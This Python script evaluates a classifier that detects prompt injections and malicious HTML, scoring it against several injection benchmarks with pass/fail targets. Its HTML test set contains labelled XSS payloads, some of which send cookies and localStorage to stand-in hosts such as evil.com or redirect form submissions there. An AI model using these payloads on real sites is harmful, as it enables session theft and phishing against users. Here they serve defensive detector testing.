#!/usr/bin/env python3
"""
Evaluate the balanced BIT model with comprehensive benchmarks.

Improvements over original:
- Conditional success/failure messages based on actual results
- Proper train/test split handling (excludes training data)
- Larger HTML test set for meaningful statistics
- Dynamic metadata loading from training
- Better error handling with informative messages
- Threshold sweep analysis
"""

import sys
import json
import time
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Set
import numpy as np
from sklearn.metrics import (
    classification_report, confusion_matrix, roc_auc_score,
    roc_curve, precision_recall_curve
)
import structlog

sys.path.append(str(Path(__file__).parent))

from benchmarks.benchmark_datasets import (
    load_satml_dataset,
    load_deepset_dataset,
    load_llmail_dataset,
    load_notinject_dataset
)
from src.detection.embedding_classifier import EmbeddingClassifier
from src.detection.html_preprocessor import preprocess_for_detection, analyze_html_content

logger = structlog.get_logger()

# Target metrics for pass/fail determination
TARGET_METRICS = {
    "deepset_benign": {"max_fpr": 0.05, "description": "deepset benign FPR"},
    "NotInject": {"max_fpr": 0.05, "description": "NotInject FPR"},
    "deepset_injections": {"min_recall": 0.85, "description": "deepset injection recall"},
    "SaTML": {"min_recall": 0.80, "description": "SaTML recall"},
    "LLMail": {"min_recall": 0.80, "description": "LLMail recall"},
    "Overall": {"max_fpr": 0.05, "min_recall": 0.85, "description": "Overall metrics"}
}


def load_training_metadata(model_dir: Path) -> Optional[Dict]:
    """Load training metadata to get excluded sample IDs."""
    metadata_paths = [
        model_dir / "bit_xgboost_balanced_v2_metadata.json",
        model_dir / "bit_xgboost_balanced_metadata.json"
    ]
    
    for path in metadata_paths:
        if path.exists():
            with open(path) as f:
                return json.load(f)
    
    return None


def evaluate_classifier(
    classifier: EmbeddingClassifier,
    dataset_name: str,
    texts: List[str],
    labels: List[int],
    preprocess: bool = False,
    excluded_indices: Optional[Set[int]] = None
) -> Dict:
    """
    Evaluate classifier on a dataset with proper handling.
    
    Args:
        classifier: Trained classifier
        dataset_name: Name of the dataset
        texts: Input texts
        labels: Ground truth labels
        preprocess: Whether to apply HTML preprocessing
        excluded_indices: Indices to exclude (training data)
    
    Returns:
        Dictionary with evaluation metrics
    """
    # Filter out excluded indices if provided
    if excluded_indices:
        filtered_texts = []
        filtered_labels = []
        for i, (text, label) in enumerate(zip(texts, labels)):
            if i not in excluded_indices:
                filtered_texts.append(text)
                filtered_labels.append(label)
        texts = filtered_texts
        labels = filtered_labels
        print(f"  Excluded {len(excluded_indices)} training samples")
    
    if len(texts) == 0:
        print(f"  Warning: No samples remaining after filtering for {dataset_name}")
        return {"dataset": dataset_name, "error": "No samples after filtering"}
    
    print(f"\nEvaluating on {dataset_name}...")
    print(f"  Samples: {len(texts)}")
    print(f"  Class distribution: {sum(labels)} malicious, {len(labels) - sum(labels)} benign")
    
    # Preprocess if needed
    if preprocess:
        processed_texts = []
        for i, text in enumerate(texts):
            try:
                processed = preprocess_for_detection(text, source_type="auto")
                processed_texts.append(processed)
            except Exception as e:
                print(f"  Warning: Preprocessing failed for sample {i}: {e}")
                processed_texts.append(text)
        
        # Show sample preprocessing
        if texts and processed_texts[0] != texts[0]:
            print(f"  Sample preprocessing:")
            print(f"    Original: {texts[0][:80]}...")
            print(f"    Processed: {processed_texts[0][:80]}...")
        
        texts = processed_texts
    
    # Get predictions
    start_time = time.time()
    try:
        probs = classifier.predict_proba(texts)
        predictions = classifier.predict(texts)
    except Exception as e:
        print(f"  Error during prediction: {e}")
        return {"dataset": dataset_name, "error": str(e)}
    
    duration = time.time() - start_time
    
    # Handle edge cases
    unique_labels = np.unique(labels)
    
    if len(unique_labels) == 1:
        # Single class dataset
        if unique_labels[0] == 0:
            # All benign - calculate FPR
            fp = np.sum(predictions == 1)
            tn = np.sum(predictions == 0)
            fpr = fp / len(predictions) if len(predictions) > 0 else 0
            
            results = {
                "dataset": dataset_name,
                "preprocessed": preprocess,
                "samples": len(texts),
                "single_class": "benign",
                "fpr": fpr,
                "fp": int(fp),
                "tn": int(tn),
                "accuracy": float(tn / len(predictions)) if len(predictions) > 0 else 0,
                "duration_ms": duration * 1000,
                "threshold": classifier.threshold
            }
        else:
            # All malicious - calculate recall
            tp = np.sum(predictions == 1)
            fn = np.sum(predictions == 0)
            recall = tp / len(predictions) if len(predictions) > 0 else 0
            
            results = {
                "dataset": dataset_name,
                "preprocessed": preprocess,
                "samples": len(texts),
                "single_class": "malicious",
                "recall": recall,
                "tp": int(tp),
                "fn": int(fn),
                "accuracy": float(tp / len(predictions)) if len(predictions) > 0 else 0,
                "duration_ms": duration * 1000,
                "threshold": classifier.threshold
            }
    else:
        # Mixed class dataset - full metrics
        cm = confusion_matrix(labels, predictions)
        tn, fp, fn, tp = cm.ravel()
        
        accuracy = (tp + tn) / len(labels)
        recall = tp / (tp + fn) if (tp + fn) > 0 else 0
        precision = tp / (tp + fp) if (tp + fp) > 0 else 0
        f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
        fpr = fp / (fp + tn) if (fp + tn) > 0 else 0
        fnr = fn / (fn + tp) if (fn + tp) > 0 else 0
        
        # AUC
        try:
            auc = roc_auc_score(labels, probs[:, 1])
        except Exception:
            auc = 0.0
        
        results = {
            "dataset": dataset_name,
            "preprocessed": preprocess,
            "samples": len(texts),
            "accuracy": accuracy,
            "recall": recall,
            "precision": precision,
            "f1": f1,
            "fpr": fpr,
            "fnr": fnr,
            "auc": auc,
            "confusion_matrix": {
                "tn": int(tn),
                "fp": int(fp),
                "fn": int(fn),
                "tp": int(tp)
            },
            "duration_ms": duration * 1000,
            "threshold": classifier.threshold
        }
    
    # Print summary
    print(f"  Accuracy: {results.get('accuracy', 'N/A'):.4f}" if 'accuracy' in results else "")
    if 'fpr' in results:
        print(f"  FPR: {results['fpr']:.4f} ({results['fpr']*100:.1f}%)")
    if 'recall' in results:
        print(f"  Recall: {results['recall']:.4f} ({results['recall']*100:.1f}%)")
    if 'f1' in results:
        print(f"  F1: {results['f1']:.4f}")
    
    return results


def generate_html_test_samples() -> Tuple[List[str], List[int]]:
    """Generate a larger, more diverse HTML test set."""
    
    samples = []
    
    # Benign HTML samples (label=0)
    benign_html = [
        # E-commerce
        '<div class="product"><h2>Summer Sale</h2><p>50% off all items</p><button>Shop Now</button></div>',
        '<form action="/checkout" method="post"><input type="text" name="address"><button type="submit">Complete Order</button></form>',
        '<nav><a href="/home">Home</a><a href="/products">Products</a><a href="/contact">Contact</a></nav>',
        
        # Blog/content
        '<article><h1>10 Tips for Better Sleep</h1><p>Getting enough rest is crucial...</p></article>',
        '<div class="comments"><div class="comment">Great article!</div><div class="comment">Very helpful, thanks!</div></div>',
        
        # Forms and inputs
        '<input type="email" placeholder="Enter your email" required>',
        '<select name="country"><option>USA</option><option>Canada</option><option>UK</option></select>',
        '<textarea placeholder="Leave a comment..."></textarea>',
        
        # Media
        '<img src="/images/hero.jpg" alt="Welcome banner" loading="lazy">',
        '<video controls><source src="/video.mp4" type="video/mp4"></video>',
        
        # JavaScript (benign)
        '<script>document.getElementById("menu").classList.toggle("open");</script>',
        '<script>function validateForm() { return document.forms[0].checkValidity(); }</script>',
        '<script>console.log("Page loaded"); analytics.track("pageview");</script>',
        
        # Dynamic content
        '<div id="weather-widget" data-city="New York"></div>',
        '<span class="price" data-currency="USD">$29.99</span>',
        
        # Tables
        '<table><tr><th>Name</th><th>Price</th></tr><tr><td>Widget</td><td>$10</td></tr></table>',
        
        # Footer
        '<footer><p>&copy; 2024 Company Inc.</p><a href="/privacy">Privacy Policy</a></footer>',
        
        # More realistic pages
        '<html><head><title>Welcome</title></head><body><h1>Hello World</h1></body></html>',
        '<div class="modal"><div class="modal-content"><span class="close">&times;</span><p>Subscribe to our newsletter!</p></div></div>',
        '<ul class="breadcrumb"><li><a href="/">Home</a></li><li><a href="/category">Category</a></li><li>Current Page</li></ul>'
    ]
    
    for html in benign_html:
        samples.append((html, 0))
    
    # Malicious HTML samples (label=1)
    malicious_html = [
        # XSS attacks
        '<script>alert("XSS")</script>',
        '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
        '<script>fetch("http://attacker.com/log?data="+document.cookie)</script>',
        '<img src=x onerror="alert(1)">',
        '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
        '<svg onload="alert(document.domain)">',
        '<body onload="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<marquee onstart="alert(1)">',
        '<video><source onerror="alert(1)">',
        
        # Event handler injection
        '<div onmouseover="alert(1)">Hover me</div>',
        '<a href="javascript:alert(1)">Click me</a>',
        '<iframe src="javascript:alert(1)">',
        
        # Data exfiltration
        '<script>new Image().src="http://evil.com/?"+document.cookie</script>',
        '<script>navigator.sendBeacon("http://evil.com/",JSON.stringify(localStorage))</script>',
        
        # DOM manipulation attacks
        '<script>document.forms[0].action="http://evil.com/phish"</script>',
        '<script>document.body.innerHTML="<h1>Hacked!</h1>"</script>',
        
        # Encoded attacks
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
        
        # Injection in attributes
        '"><script>alert(1)</script>',
        "' onclick='alert(1)' x='",
        '<a href="data:text/html,<script>alert(1)</script>">Click</a>'
    ]
    
    for html in malicious_html:
        samples.append((html, 1))
    
    texts = [s[0] for s in samples]
    labels = [s[1] for s in samples]
    
    return texts, labels


def check_pass_fail(dataset_name: str, results: Dict) -> Tuple[bool, str]:
    """
    Check if results pass target metrics.
    
    Returns:
        (passed: bool, message: str)
    """
    if dataset_name not in TARGET_METRICS:
        return True, "No targets defined"
    
    targets = TARGET_METRICS[dataset_name]
    issues = []
    
    if "max_fpr" in targets and "fpr" in results:
        if results["fpr"] > targets["max_fpr"]:
            issues.append(f"FPR {results['fpr']*100:.1f}% > {targets['max_fpr']*100:.1f}%")
    
    if "min_recall" in targets and "recall" in results:
        if results["recall"] < targets["min_recall"]:
            issues.append(f"Recall {results['recall']*100:.1f}% < {targets['min_recall']*100:.1f}%")
    
    if issues:
        return False, "; ".join(issues)
    
    return True, "All targets met"


def threshold_sweep_analysis(
    classifier: EmbeddingClassifier,
    texts: List[str],
    labels: List[int]
) -> Dict:
    """Analyze performance across different thresholds."""
    
    print("\nThreshold Sweep Analysis...")
    
    probs = classifier.predict_proba(texts)[:, 1]
    labels_arr = np.array(labels)
    
    thresholds = np.arange(0.1, 0.95, 0.05)
    results = []
    
    for thresh in thresholds:
        preds = (probs >= thresh).astype(int)
        
        tp = np.sum((preds == 1) & (labels_arr == 1))
        tn = np.sum((preds == 0) & (labels_arr == 0))
        fp = np.sum((preds == 1) & (labels_arr == 0))
        fn = np.sum((preds == 0) & (labels_arr == 1))
        
        fpr = fp / (fp + tn) if (fp + tn) > 0 else 0
        recall = tp / (tp + fn) if (tp + fn) > 0 else 0
        
        results.append({
            "threshold": float(thresh),
            "fpr": fpr,
            "recall": recall
        })
    
    # Find best threshold for target FPR
    best_for_fpr = None
    for r in results:
        if r["fpr"] <= 0.05:
            if best_for_fpr is None or r["recall"] > best_for_fpr["recall"]:
                best_for_fpr = r
    
    print("  Threshold | FPR    | Recall")
    print("  " + "-" * 35)
    for r in results[::2]:  # Print every other
        marker = " *" if best_for_fpr and r["threshold"] == best_for_fpr["threshold"] else ""
        print(f"  {r['threshold']:.2f}      | {r['fpr']*100:5.1f}% | {r['recall']*100:5.1f}%{marker}")
    
    if best_for_fpr:
        print(f"\n  * Best for FPR≤5%: threshold={best_for_fpr['threshold']:.2f}, "
              f"FPR={best_for_fpr['fpr']*100:.1f}%, Recall={best_for_fpr['recall']*100:.1f}%")
    
    return {
        "sweep_results": results,
        "best_for_target_fpr": best_for_fpr
    }


def main():
    """Run comprehensive evaluation on all benchmarks."""
    
    print("=" * 60)
    print("Balanced BIT Model Evaluation (Improved)")
    print("=" * 60)
    
    # Find model file
    model_dir = Path("models")
    model_candidates = [
        model_dir / "bit_xgboost_balanced_v2.json",
        model_dir / "bit_xgboost_balanced_classifier.json"
    ]
    
    model_path = None
    for candidate in model_candidates:
        if candidate.exists():
            model_path = candidate
            break
    
    if model_path is None:
        print(f"\nError: No model found. Tried:")
        for c in model_candidates:
            print(f"  - {c}")
        print("\nPlease run: python train_balanced_improved.py")
        return
    
    print(f"\nModel: {model_path}")
    
    # Load training metadata
    metadata = load_training_metadata(model_dir)
    if metadata:
        print(f"Metadata loaded from training")
        threshold = metadata.get("threshold", 0.764)
        notinject_ids_used = set(metadata.get("notinject_ids_used", []))
        training_info = metadata.get("training_data", {})
        print(f"  Threshold: {threshold}")
        print(f"  Training samples: {training_info.get('total', 'unknown')}")
    else:
        print("Warning: No training metadata found, using defaults")
        threshold = 0.764
        notinject_ids_used = set()
        training_info = {}
    
    # Initialize classifier
    classifier = EmbeddingClassifier(
        model_name="all-MiniLM-L6-v2",
        threshold=threshold,
        model_dir="models"
    )
    classifier.load_model(str(model_path))
    
    # Load datasets
    print("\n" + "=" * 60)
    print("Loading Evaluation Datasets")
    print("=" * 60)
    
    datasets = {}
    
    # SaTML (injections only)
    try:
        satml = load_satml_dataset(limit=5000)  # Limit for faster eval
        datasets["SaTML"] = (satml.texts, satml.labels)
        print(f"  SaTML: {len(satml.texts)} samples (all injections)")
    except Exception as e:
        print(f"  SaTML: Failed to load - {e}")
    
    # deepset (mixed)
    try:
        deepset = load_deepset_dataset(include_safe=True)
        # Split into benign and injection
        deepset_benign = ([t for t, l in zip(deepset.texts, deepset.labels) if l == 0],
                         [0] * sum(1 for l in deepset.labels if l == 0))
        deepset_inject = ([t for t, l in zip(deepset.texts, deepset.labels) if l == 1],
                         [1] * sum(1 for l in deepset.labels if l == 1))
        datasets["deepset_benign"] = deepset_benign
        datasets["deepset_injections"] = deepset_inject
        print(f"  deepset_benign: {len(deepset_benign[0])} samples")
        print(f"  deepset_injections: {len(deepset_inject[0])} samples")
    except Exception as e:
        print(f"  deepset: Failed to load - {e}")
    
    # NotInject (benign with triggers)
    try:
        notinject = load_notinject_dataset()
        datasets["NotInject"] = (notinject.texts, notinject.labels)
        print(f"  NotInject: {len(notinject.texts)} samples (all benign)")
        
        # Create exclusion set based on training IDs
        if notinject_ids_used:
            excluded_indices = set()
            for i in range(len(notinject.texts)):
                if f"notinject_{i}" in notinject_ids_used:
                    excluded_indices.add(i)
            print(f"    Will exclude {len(excluded_indices)} samples used in training")
        else:
            excluded_indices = None
    except Exception as e:
        print(f"  NotInject: Failed to load - {e}")
        excluded_indices = None
    
    # LLMail
    try:
        llmail = load_llmail_dataset(limit=5000)  # Limit for faster eval
        datasets["LLMail"] = (llmail.texts, llmail.labels)
        print(f"  LLMail: {len(llmail.texts)} samples (all injections)")
    except Exception as e:
        print(f"  LLMail: Failed to load - {e}")
    
    # HTML test samples
    html_texts, html_labels = generate_html_test_samples()
    datasets["HTML"] = (html_texts, html_labels)
    print(f"  HTML: {len(html_texts)} samples ({sum(html_labels)} malicious)")
    
    # Run evaluations
    print("\n" + "=" * 60)
    print("Running Evaluations")
    print("=" * 60)
    
    all_results = {}
    pass_fail_summary = []
    
    for name, (texts, labels) in datasets.items():
        # Special handling for NotInject to exclude training data
        excluded = excluded_indices if name == "NotInject" else None
        
        result = evaluate_classifier(
            classifier, name, texts, labels,
            preprocess=(name == "HTML"),
            excluded_indices=excluded
        )
        all_results[name] = result
        
        # Check pass/fail
        passed, message = check_pass_fail(name, result)
        pass_fail_summary.append((name, passed, message, result))
    
    # Combine for overall metrics
    overall_texts = []
    overall_labels = []
    for name in ["SaTML", "deepset_benign", "deepset_injections", "NotInject"]:
        if name in datasets:
            texts, labels = datasets[name]
            # Apply same exclusion logic
            if name == "NotInject" and excluded_indices:
                texts = [t for i, t in enumerate(texts) if i not in excluded_indices]
                labels = [l for i, l in enumerate(labels) if i not in excluded_indices]
            overall_texts.extend(texts)
            overall_labels.extend(labels)
    
    if overall_texts:
        overall_result = evaluate_classifier(
            classifier, "Overall", overall_texts, overall_labels
        )
        all_results["Overall"] = overall_result
        passed, message = check_pass_fail("Overall", overall_result)
        pass_fail_summary.append(("Overall", passed, message, overall_result))
    
    # Threshold sweep on overall data
    if overall_texts:
        sweep_results = threshold_sweep_analysis(classifier, overall_texts, overall_labels)
        all_results["threshold_sweep"] = sweep_results
    
    # Print summary table
    print("\n" + "=" * 60)
    print("Performance Summary")
    print("=" * 60)
    print(f"{'Dataset':<22} {'FPR':<10} {'Recall':<10} {'F1':<10} {'Status':<20}")
    print("-" * 72)
    
    for name, passed, message, result in pass_fail_summary:
        fpr = result.get("fpr", None)
        recall = result.get("recall", None)
        f1 = result.get("f1", None)
        
        fpr_str = f"{fpr*100:.1f}%" if fpr is not None else "N/A"
        recall_str = f"{recall*100:.1f}%" if recall is not None else "N/A"
        f1_str = f"{f1:.3f}" if f1 is not None else "N/A"
        status = "✅ PASS" if passed else f"❌ FAIL"
        
        print(f"{name:<22} {fpr_str:<10} {recall_str:<10} {f1_str:<10} {status:<20}")
    
    # Conditional summary based on actual results
    print("\n" + "=" * 60)
    print("Evaluation Summary")
    print("=" * 60)
    
    total_tests = len(pass_fail_summary)
    passed_tests = sum(1 for _, passed, _, _ in pass_fail_summary if passed)
    
    if passed_tests == total_tests:
        print("✅ All targets met!")
    else:
        print(f"⚠️  {passed_tests}/{total_tests} targets met")
    
    # Specific metric reports
    if "deepset_benign" in all_results:
        fpr = all_results["deepset_benign"].get("fpr", 1.0)
        original_fpr = 0.402  # From original report
        if fpr < original_fpr:
            improvement = (original_fpr - fpr) / original_fpr * 100
            print(f"✅ deepset benign FPR improved: {original_fpr*100:.1f}% → {fpr*100:.1f}% ({improvement:.0f}% reduction)")
        else:
            print(f"❌ deepset benign FPR not improved: {fpr*100:.1f}% (target: <5%)")
    
    if "Overall" in all_results:
        overall_fpr = all_results["Overall"].get("fpr", 1.0)
        overall_recall = all_results["Overall"].get("recall", 0.0)
        
        if overall_fpr <= 0.05:
            print(f"✅ Overall FPR: {overall_fpr*100:.1f}% (target: ≤5%)")
        else:
            print(f"❌ Overall FPR: {overall_fpr*100:.1f}% (target: ≤5%)")
        
        if overall_recall >= 0.85:
            print(f"✅ Overall Recall: {overall_recall*100:.1f}% (target: ≥85%)")
        else:
            print(f"❌ Overall Recall: {overall_recall*100:.1f}% (target: ≥85%)")
    
    # Save results
    results_dir = Path("results")
    results_dir.mkdir(exist_ok=True)
    results_file = results_dir / "balanced_model_evaluation_v2.json"
    
    save_data = {
        "model": str(model_path),
        "threshold": threshold,
        "date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "training_info": training_info,
        "datasets": all_results,
        "pass_fail_summary": [
            {"dataset": name, "passed": passed, "message": message}
            for name, passed, message, _ in pass_fail_summary
        ],
        "targets": TARGET_METRICS
    }
    
    with open(results_file, "w") as f:
        json.dump(save_data, f, indent=2, default=str)
    
    print(f"\nDetailed results saved to: {results_file}")
    
    # Recommendations
    print("\n" + "=" * 60)
    print("Recommendations")
    print("=" * 60)
    
    failed_datasets = [name for name, passed, _, _ in pass_fail_summary if not passed]
    
    if not failed_datasets:
        print("1. ✅ Model ready for deployment")
        print("2. Update paper results with these metrics")
        print("3. Document preprocessing requirements in deployment guide")
    else:
        print(f"1. ⚠️  Address failures in: {', '.join(failed_datasets)}")
        
        if "deepset_benign" in failed_datasets:
            print("   - Consider adding more diverse benign training samples")
            print("   - Review threshold calibration")
        
        if any(d in failed_datasets for d in ["SaTML", "LLMail", "deepset_injections"]):
            print("   - Review malicious sample coverage")
            print("   - Consider lowering threshold (will increase FPR)")
        
        print("2. Re-run training with adjusted parameters")
        print("3. Use threshold sweep analysis to find optimal trade-off")


if __name__ == "__main__":
    main()
